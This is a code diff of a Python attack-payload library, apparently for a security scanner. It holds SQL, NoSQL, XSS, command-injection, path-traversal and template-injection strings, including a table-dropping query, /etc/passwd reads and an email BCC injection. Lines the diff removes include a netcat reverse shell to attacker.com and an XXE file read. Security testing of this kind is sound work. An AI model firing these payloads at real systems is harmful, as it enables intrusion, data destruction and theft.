@@ -1,115 +1,80 @@
-"""
-Attack Payload Library
-Contains various attack patterns for different vulnerability types
-"""
-
 class AttackPayloads:
-    """Collection of attack payloads organized by category"""
-    
-    # SQL Injection Payloads
+
     SQL_INJECTION = [
         "' OR '1'='1",
+        "' OR 1=1--",
         "' OR '1'='1' --",
-        "' OR '1'='1' /*",
+        "'; DROP TABLE users--",
         "admin'--",
         "admin' #",
         "' UNION SELECT NULL--",
         "' UNION SELECT NULL,NULL--",
-        "1' AND '1'='1",
-        "1' AND '1'='2",
-        "'; DROP TABLE users--",
-        "' OR 1=1--",
-        "') OR ('1'='1",
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' OR sleep(5)--",
         "' WAITFOR DELAY '00:00:05'--",
     ]
-    
-    # NoSQL Injection
+
     NOSQL_INJECTION = [
-        "{'$gt': ''}",
-        "{'$ne': null}",
-        "{'$regex': '.*'}",
+        {"$ne": None},
+        {"$gt": ""},
+        {"$regex": ".*"},
+        {"$where": "sleep(5000)"},
         "admin' || '1'=='1",
-        "{username: {$gt: ''}}",
     ]
-    
-    # XSS (Cross-Site Scripting)
+
     XSS_PAYLOADS = [
-        "<script>alert('XSS')</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "<svg/onload=alert('XSS')>",
-        "javascript:alert('XSS')",
-        "<iframe src=javascript:alert('XSS')>",
-        "<body onload=alert('XSS')>",
-        "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "'\"><script>alert(1)</script>",
+        "<body onload=alert(1)>",
+        "<iframe src=javascript:alert(1)>",
     ]
-    
-    # Command Injection
+
     COMMAND_INJECTION = [
-        "; ls -la",
+        "; whoami",
+        "&& whoami",
         "| whoami",
-        "&& cat /etc/passwd",
-        "`id`",
+        "`whoami`",
         "$(whoami)",
-        "; ping -c 10 127.0.0.1",
-        "| nc -e /bin/sh attacker.com 4444",
+        "; id",
+        "&& id",
+        "; uname -a",
     ]
-    
-    # Path Traversal
+
     PATH_TRAVERSAL = [
         "../../../etc/passwd",
+        "../../../../../../etc/passwd",
         "..\\..\\..\\windows\\system32\\config\\sam",
-        "....//....//....//etc/passwd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "../../../../../../../../../../etc/passwd",
+        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
     ]
-    
-    # LDAP Injection
-    LDAP_INJECTION = [
-        "*",
-        "*)(&",
-        "*)(|(objectClass=*",
-        "admin)(&(password=*))",
-    ]
-    
-    # XML Injection / XXE
-    XML_INJECTION = [
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-        "<![CDATA[<script>alert('XSS')</script>]]>",
-    ]
-    
-    # Template Injection
+
     TEMPLATE_INJECTION = [
         "{{7*7}}",
         "${7*7}",
         "{{config}}",
         "{{self}}",
         "<%= 7*7 %>",
-        "${T(java.lang.Runtime).getRuntime().exec('calc')}",
     ]
-    
-    # Buffer Overflow / Format String
+
     BUFFER_OVERFLOW = [
         "A" * 1000,
         "A" * 5000,
         "A" * 10000,
-        "%s%s%s%s%s%s%s%s%s%s",
-        "%x%x%x%x%x%x%x%x%x%x",
+        "%x%x%x%x%x%x%x",
     ]
-    
-    # Special Characters (encoding/parsing issues)
+
     SPECIAL_CHARS = [
-        "\x00",  # Null byte
-        "\n\r",  # CRLF
+        "\x00",
+        "\n",
+        "\r",
         "../../",
         "{{",
         "}}",
         "${",
-        "\x7f",  # DEL character
-        "\\x00",
-        "\u0000",
     ]
-    
-    # Type Confusion
+
     TYPE_CONFUSION = [
         None,
         True,
@@ -118,46 +83,89 @@ class AttackPayloads:
         {},
         0,
         -1,
-        9999999999999999,
+        999999999999999,
         "null",
         "undefined",
-        "NaN",
     ]
-    
-    # Integer Overflow/Underflow
+
     INTEGER_ATTACKS = [
         0,
         -1,
-        -2147483648,  # Min int32
-        2147483647,   # Max int32
-        -9223372036854775808,  # Min int64
-        9223372036854775807,   # Max int64
+        -2147483648,
+        2147483647,
         999999999999999999,
     ]
-    
-    # Email-specific attacks
+
     EMAIL_ATTACKS = [
-        "test@example.com\nBCC:attacker@evil.com",
-        "test+<script>alert('xss')</script>@example.com",
+        "test@example.com\nBCC:evil@attacker.com",
+        "test+<script>alert(1)</script>@example.com",
         "test@evil.com%00@example.com",
-        "\"test@test\"@example.com",
     ]
-    
+
     @classmethod
     def get_all_categories(cls):
-        """Return all attack categories"""
         return {
-            'sql_injection': cls.SQL_INJECTION,
-            'nosql_injection': cls.NOSQL_INJECTION,
-            'xss': cls.XSS_PAYLOADS,
-            'command_injection': cls.COMMAND_INJECTION,
-            'path_traversal': cls.PATH_TRAVERSAL,
-            'ldap_injection': cls.LDAP_INJECTION,
-            'xml_injection': cls.XML_INJECTION,
-            'template_injection': cls.TEMPLATE_INJECTION,
-            'buffer_overflow': cls.BUFFER_OVERFLOW,
-            'special_chars': cls.SPECIAL_CHARS,
-            'type_confusion': cls.TYPE_CONFUSION,
-            'integer_attacks': cls.INTEGER_ATTACKS,
-            'email_attacks': cls.EMAIL_ATTACKS,
+            "sql_injection": cls.SQL_INJECTION,
+            "nosql_injection": cls.NOSQL_INJECTION,
+            "xss": cls.XSS_PAYLOADS,
+            "command_injection": cls.COMMAND_INJECTION,
+            "path_traversal": cls.PATH_TRAVERSAL,
+            "template_injection": cls.TEMPLATE_INJECTION,
+            "buffer_overflow": cls.BUFFER_OVERFLOW,
+            "special_chars": cls.SPECIAL_CHARS,
+            "type_confusion": cls.TYPE_CONFUSION,
+            "integer_attacks": cls.INTEGER_ATTACKS,
+            "email_attacks": cls.EMAIL_ATTACKS,
+        }
+
+    @classmethod
+    def generate_contextual_payloads(cls, param_name: str):
+        param = param_name.lower()
+
+        if "id" in param:
+            return cls.INTEGER_ATTACKS + ["1 OR 1=1", -999999]
+
+        if "user" in param or "email" in param:
+            return cls.SQL_INJECTION + cls.EMAIL_ATTACKS
+
+        if "search" in param or "q" in param:
+            return cls.XSS_PAYLOADS + cls.SQL_INJECTION
+
+        if "cmd" in param or "exec" in param:
+            return cls.COMMAND_INJECTION
+
+        return (
+            cls.SQL_INJECTION
+            + cls.XSS_PAYLOADS
+            + cls.COMMAND_INJECTION
+            + cls.SPECIAL_CHARS
+        )
+
+    @classmethod
+    def generate_combo_payloads(cls):
+        combos = []
+
+        for sqli in cls.SQL_INJECTION[:3]:
+            for xss in cls.XSS_PAYLOADS[:2]:
+                combos.append(f"{sqli} {xss}")
+
+        for cmd in cls.COMMAND_INJECTION[:3]:
+            combos.append(f"test {cmd}")
+
+        return combos
+
+    @classmethod
+    def get_aggressive_payloads(cls, param_name: str):
+        base = cls.generate_contextual_payloads(param_name)
+        combos = cls.generate_combo_payloads()
+
+        return base + combos
+
+    @classmethod
+    def detection_signatures(cls):
+        return {
+            "sql_injection": ["sql", "syntax", "mysql", "sqlite", "error"],
+            "xss": ["<script>", "alert(", "<img", "<svg"],
+            "command_injection": ["root", "uid=", "gid=", "linux"],
+            "path_traversal": ["root:x", "bin/bash", "windows"],
         }
